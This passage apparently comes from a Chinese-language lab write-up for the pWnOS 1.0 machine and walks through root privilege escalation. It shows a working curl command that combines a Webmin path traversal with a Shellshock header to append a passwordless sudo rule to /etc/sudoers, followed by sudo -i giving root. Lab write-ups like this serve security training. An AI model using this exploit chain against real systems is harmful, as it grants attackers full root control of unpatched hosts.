Sun Nov  1 06:03:56 CST 2026
```

创建cgi程序

```Shell
vmware@ubuntuvm:~$ echo '#!/bin/bash' > priv.cgi
vmware@ubuntuvm:~$ chmod +x priv.cgi
```

这样当WebMin运行该CGI程序时就会启动bash会话  
构建请求Payload

```Shell
┌──(kali㉿kali)-[~/pWnOS1.0]
└─$ curl http://10.10.10.4:10000/unauthenticated/..%01/..%01/..%01/..%01/..%01/home/vmware/priv.cgi -A '() { :;}; echo "vmware ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers'
```

查看靶机vmware用户权限, 已经可以无密码执行任何命令了

```Shell
vmware@ubuntuvm:~$ sudo -l
User vmware may run the following commands on this host:
    (ALL) NOPASSWD: ALL
```

直接提权

```Shell
vmware@ubuntuvm:~$ sudo -i
root@ubuntuvm:~# whoami
root
```

本靶机无Flag, 获得root权限即完成
